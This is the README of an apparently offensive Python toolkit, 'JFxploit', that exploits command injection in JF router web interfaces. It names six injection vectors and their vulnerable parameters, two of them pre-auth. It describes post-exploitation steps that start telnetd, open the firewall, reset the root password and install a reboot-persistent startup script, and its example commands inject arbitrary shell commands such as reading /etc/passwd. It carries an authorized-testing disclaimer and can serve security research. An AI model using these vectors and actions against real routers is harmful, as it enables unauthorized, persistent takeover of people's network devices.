# JFxploit

A Python CLI toolkit for exploiting web interface vulnerabilities in JF routers. Implements multiple RCE injection vectors with a plug-in exploit architecture, post-exploitation actions, and telnet access verification.

> **Intended for authorized security research and penetration testing only.**

---

## Features

- Multiple exploit modules (pre-auth and post-auth), selectable or auto-tried in order
- Composable post-exploitation actions: start telnetd, open firewall, set root password, install persistence
- Custom command injection via `--action custom --cmd`
- Per-exploit `enabled` flag — disabled exploits are hidden from listing and blocked from execution
- Telnet reachability verification after exploitation
- Rich terminal output with configuration summary

---

## Requirements

- Python 3.11+
- [uv](https://docs.astral.sh/uv/) (recommended) or pip

---

## Installation

```bash
git clone <repo-url>
cd JFxploit

# with uv (recommended)
uv sync

# or with pip
pip install -e .
```

---

## Quick Start

```bash
# Full exploitation with all actions, auto-select exploit
uv run jfxploit run 192.168.29.1

# Specify credentials and root password to set
uv run jfxploit run 192.168.29.1 -u superadmin -P 'adminpass' -r 'newrootpass'

# Use a specific exploit
uv run jfxploit run 192.168.29.1 --exploit f01

# Run only selected actions
uv run jfxploit run 192.168.29.1 --action telnet --action iptables

# Inject a custom shell command
uv run jfxploit run 192.168.29.1 --action custom --cmd 'cat /etc/passwd'

# Multiple custom commands
uv run jfxploit run 192.168.29.1 --action custom --cmd 'id' --cmd 'uname -a'

# Mix actions: open telnet, then run a custom command
uv run jfxploit run 192.168.29.1 --action telnet --action iptables --action custom --cmd 'ls /flash2'
```

---

## Commands

### `jfxploit run`

```text
Usage: jfxploit run [OPTIONS] TARGET

Arguments:
  TARGET    Router IP or hostname  [required]

Options:
  -p, --port          INTEGER  Web UI port [default: 80]
  -u, --user          TEXT     Admin username [default: superadmin]
  -P, --password      TEXT     Admin password
  -r, --root-pass     TEXT     Root password to set on the router
  -t, --telnet-port   INTEGER  Telnet port to open [default: 23]
  -e, --exploit       TEXT     Exploit ID or 'auto' [default: auto]
  -a, --action        TEXT     Action(s) to perform (repeatable) [default: all]
  -c, --cmd           TEXT     Shell command to inject (repeatable, requires --action custom)
      --no-verify              Skip telnet verification after exploitation
      --list-exploits          Show available exploits and exit
      --list-actions           Show available actions and exit
```

### `jfxploit exploits`

List all enabled exploit modules with their auth requirement and description.

### `jfxploit actions`

List all available post-exploitation actions.

---

## Exploits

| ID | Auth | Vector |
| ----- | ------------ | -------- |
| f01 | Pre-Auth | `RequestMethod` header injection in Mesh API debug logger |
| f02 | Post-Auth | `Threshold_Val` field injection in Mesh API login handler |
| f04 | Post-Auth | `gpon.vlanID` shell injection in GPON/WAN configuration |
| f05 | Post-Auth | `server` parameter injection in `jsonApi` speed test handler |
| f06 | Post-Auth | `website` parameter injection in `jsonApi` web download handler |
| f07 | Pre-Auth | `Admin_Password` field injection in Mesh API ForcedLogin handler |

When `--exploit auto` is used (the default), exploits are tried in the order above — pre-auth first, then post-auth — and the first successful one is used.

### Disabling an exploit

Set `enabled = False` in the module file (e.g. `jfxploit/exploits/f05_speedtest.py`). Disabled exploits are hidden from `jfxploit exploits` and cannot be selected explicitly or via auto-select.

---

## Actions

| Action | Effect |
| ------------ | -------- |
| `telnet` | Start `telnetd` daemon on the router |
| `iptables` | Insert firewall rule to allow inbound traffic on the telnet port |
| `rootpass` | Set a custom root password via `passwd` |
| `persist` | Write a startup script to `/flash2/pfrm2.0/etc/customInit` so telnet and the root password survive reboots |
| `custom` | Inject arbitrary shell command(s) supplied via `--cmd` |
| `all` | Run `telnet`, `iptables`, `rootpass`, and `persist` (not `custom`) |

---

## Project Structure

```text
jfxploit/
├── core/
│   ├── models.py       — Target, ExploitResult, ActionType dataclasses
│   └── session.py      — Shared post-auth session helper (cookie + CSRF token)
├── exploits/
│   ├── base.py         — Exploit Protocol definition
│   ├── registry.py     — Exploit lookup, auto-selection, enabled filtering
│   ├── fxx_...         — Exploit modules f01_..., f02_..., etc.
├── actions/
│   ├── commands.py     — Shell command builders for each action
│   └── verify.py       — TCP telnet reachability check
└── cli.py              — Typer CLI entrypoint
```

---

## Adding a New Exploit

Create `jfxploit/exploits/fXX_name.py` with the following module-level variables and a `run` function:

```python
import httpx
from ..core.models import ExploitResult, Target

id = "fXX"
name = "Short human-readable name"
description = "One-line description shown in jfxploit exploits"
requires_auth = True   # or False for pre-auth
enabled = True

def run(target: Target, commands: list[str]) -> ExploitResult:
    # Join commands and inject them via your vector
    payload = ";" + ";".join(commands) + ";"
    ...
    return ExploitResult(success=True, exploit_id=id, message="Payload delivered")
```

Then register it in `jfxploit/exploits/registry.py`:

```python
from . import fXX_name

_EXPLOITS: dict[str, ModuleType] = {
    ...
    "fXX": fXX_name,
}
_AUTO_ORDER = [..., "fXX"]
```

---

## License

See [LICENSE](./LICENSE.md) for details.
